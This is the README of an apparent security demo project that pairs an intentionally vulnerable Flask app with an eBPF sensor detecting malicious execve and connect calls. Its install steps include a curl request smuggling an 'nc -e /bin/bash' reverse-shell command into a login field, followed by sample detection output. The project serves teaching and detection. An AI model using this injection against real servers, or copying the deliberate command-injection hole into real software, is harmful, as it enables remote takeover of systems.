# RCE-Demo with eBPF Detection

A comprehensive security demonstration environment featuring a vulnerable web application with Remote Code Execution (RCE) and an eBPF-based sensor that detects malicious system calls in real-time using Indicators of Behavior (IoB).

##  Overview

This project provides a complete sandbox environment for:
- Understanding RCE vulnerabilities in web applications
- Learning eBPF (Extended Berkeley Packet Filter) for runtime security
- Implementing behavior-based detection (IoB) for malicious activities
- Observing how system calls can be monitored at the kernel level

The demo consists of two main components:
1. **Vulnerable Web Server** - A Python Flask application with intentional command injection vulnerability
2. **eBPF Sensor** - A kernel-level program that hooks `execve` and `connect` system calls to detect suspicious behavior

## Installation

```bash
# Clone the repository
git clone https://github.com/Astixxx/RCE-demo.git
cd RCE-demo

# Build the vulnerable container
docker build -t rce-vuln-app .

# Run the container (Run only in LAN!!!)
docker run -d --rm\
  --name rce-target \
  -p 8080:8080 \  # Web port for our web-server
  rce-vuln-app

# Run the eBPF-sensor
docker exec -it rce-target ./eBPF-hook.sh

# Attack vunlnable server
curl -X POST http://localhost:8080/ -d "username=; nc -e /bin/bash localhost <any port>;&password=test"

# Watch the output of eBPF-sensor
...
[!!!] MALICIOUS BEHAVIOR DETECTED ---> Possible RCE
bash(23618): tracepoint:syscalls:sys_enter_execve
[!!!] MALICIOUS BEHAVIOR DETECTED ---> Possible RCE
nc(23618): tracepoint:syscalls:sys_enter_connect
...
